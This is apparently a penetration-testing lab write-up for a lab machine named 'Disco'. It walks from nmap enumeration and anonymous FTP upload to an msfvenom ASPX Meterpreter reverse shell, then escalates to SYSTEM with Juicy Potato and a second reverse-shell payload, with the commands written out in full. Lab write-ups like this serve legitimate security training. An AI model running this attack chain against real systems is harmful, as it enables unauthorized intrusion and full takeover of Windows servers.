# Disco (10.11.1.13)
****
## Enumeration
1. Enumerate running services using `nmap`
```
nmap -sV -sC -Pn 10.11.1.13
```

2. `nmap` was able to detect several running services, but for this machine, the area of interest is the **FTP** service running on port **21**, and the **HTTP** service running on port **4176**
   

``` 
21/tcp    open  ftp          syn-ack Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 04-07-19  10:25PM       <DIR>          aspnet_client
| 04-07-19  07:14PM                99710 iis-85.png
|_04-07-19  07:14PM                  701 iisstart.htm
| ftp-syst: 
|_  SYST: Windows_NT
...
...
4167/tcp  open  http         syn-ack Microsoft IIS httpd 8.5
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/8.5
|_http-title: IIS Windows Server
```

3. Notice that `nmap` was able to detect that FTP anonymous login is enabled. We should be able to confirm this by connecting into the FTP server using the command 
   `ftp anonymous@10.11.1.13`
   
```
$ ftp anonymous@10.11.1.13
Connected to 10.11.1.13.
220 Microsoft FTP Service
331 Anonymous access allowed, send identity (e-mail name) as password.
Password: [ENTER]
230 User logged in.
Remote system type is Windows_NT.
```   

4. While logged-in, we check our privileges using the command `ls` - to check if we have a read access, and `put test.txt` - to check if we can upload files 

```
ftp> ls
229 Entering Extended Passive Mode (|||49177|)
125 Data connection already open; Transfer starting.
04-07-19  10:25PM       <DIR>          aspnet_client
04-07-19  07:14PM                99710 iis-85.png
04-07-19  07:14PM                  701 iisstart.htm
226 Transfer complete.
ftp> put local-file.txt
local: test.txt remote: test.txt
229 Entering Extended Passive Mode (|||49178|)
125 Data connection already open; Transfer starting.
100% |*************************|  16  214.04 KiB/s    --:-- ETA
226 Transfer complete.
```

> [!note] 
> Take note of the file `iis-85.png` 

5. Using a browser, navigate to `http://10.11.1.13:4167/` and we should see an **IIS Windows Server** landing page. Checking on the source code, we should see a reference to a file we saw earlier on the FTP server - the file `iis-85.png`.
   ![[iis-85.png]]
   
6. We should be able to confirm if this is indeed where the FTP files are being uploaded by checking the existence of the `test.txt` file we used earlier when testing for write access.   
![[disco-test.png]]

***

## Exploitation

1. Since the target is running an **IIS Windows Server**, we need to use ASPX to establish a reverse shell. We used **MSFVenom** to generate an ASPX shell.   
```
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=KALI_IP LPORT=9001 -f aspx > shell.aspx 
```

> [!note] 
> Replace the `KALI_IP` with your Kali's IP address 

2. We spawn a meterpreter listener to catch the shell.
```
msfconsole -q -x "use multi/handler; set payload windows/x64/meterpreter_reverse_tcp; set lhost KALI_IP; set lport 9001; exploit"
```

> [!note] 
> Replace the `KALI_IP` with your Kali's IP address 

3. We upload and initiated the shell using the following commands
   
```
curl -u anonymous: -T shell.aspx ftp://10.11.1.13/shell.aspx && curl http://10.11.1.13:4167/shell.aspx
```

4. After some time, we got a meterpreter session running as 
   `IIS APPPOOL\DefaultAppPool`.

   ![[disco-meterpreter.png]]

***
## Post-exploitation
1. From meterpreter, we checked our current privileges using the command `getprivs`
   ![[disco-http-privs.png]]
   
   We noticed that `SeImpersonate` and `SeAssignPrimaryToken` privileges are enabled, which indicates that it could be vulnerable to a Privilege Escalation attack called [Token Impersonation](https://systemweakness.com/privilege-escalation-using-token-impersonation-windows-5d54404ed488)
   
2. We used an exploit called [Juicy Potato](https://ohpe.it/juicy-potato/), which is a Windows Privilege Escalation tool that abuses the above mentioned privileges. 
   
> [!info] 
> Juicy Potato can be downloaded [here](https://github.com/ohpe/juicy-potato/releases/tag/v0.1).	 

3. We generated an executable payload that we used with Juicy Potato.
   
```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=KALI_IP LPORT=9002 -f exe -o reverse.exe
```

4. Using our meterpreter session, we transferred `JuicyPotato.exe` and our executable payload (`reverse.exe`) into the victim.

![[disco-upload-payloads.png]]
5. After setting up the `netcat` listener on our Kali (on port 9002), we fired up the exploit using the following command

```
JuicyPotato.exe -t t -p reverse.exe -l 5831
```

![[disco-fired.png]]
6. We were then able to get a reverse shell running as `nt authority\system`
   
![[disco-nt-system.png]]

![[disco-proof.png]]
